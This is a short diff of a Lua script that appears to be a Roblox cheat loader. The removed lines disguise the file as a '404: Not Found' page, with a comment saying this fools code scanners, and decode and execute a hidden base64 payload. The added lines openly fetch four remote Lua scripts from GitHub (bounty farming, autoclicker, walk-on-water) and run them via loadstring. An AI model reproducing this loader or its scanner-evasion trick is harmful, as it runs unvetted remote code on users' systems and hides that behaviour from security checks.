@@ -1,8 +1,4 @@
---[[ 404: Not Found ]]
-local _="404: Not Found" -- Dòng này để đánh lừa các công cụ quét code
-local s = "BG9hZHN0cmluZyhnYW1lOkh0dHBHZXQoImh0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS9vYmlpeWV1ZW0vdnRoYW5nc2l0aW5rL3JlZnMvaGVhZHMvbWFpbi9CYW5hbmFDYXQtQm91bnR5RXoubHVhIikpKCkgbG9hZHN0cmluZyhnYW1lOkh0dHBHZXQoImh0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS9uazIxMC9ibG9jcGh1dC9yZWZzL2hlYWRzL21haW4vYXV0b2NsaWNrZXIubHVhIikpKCkgbG9hZHN0cmluZyhnYW1lOkh0dHBHZXQoImh0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS9uazIxMC9ibG9jcGh1dC9yZWZzL2hlYWRzL21haW4vZml4c3VzLmx1YSIpKSgpIGxvYWRzdHJpbmcoZ2FtZTpIdHRwR2V0KCJodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20vbmsyMTAvYmxvY3BodXQvcmVmcy9oZWFkcy9tYWluL3dhbGtvbndhdGVyLmx1YSIpKSgp"
-if game:IsLoaded() then
-    loadstring(game:GetService("HttpService"):Base64Decode(s))()
-else
-    print(_ )
-end
+loadstring(game:HttpGet("https://raw.githubusercontent.com/obiiyeuem/vthangsitink/refs/heads/main/BananaCat-BountyEz.lua"))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/nk210/blocphut/refs/heads/main/autoclicker.lua"))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/nk210/blocphut/refs/heads/main/fixsus.lua"))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/nk210/blocphut/refs/heads/main/walkonwater.lua"))()
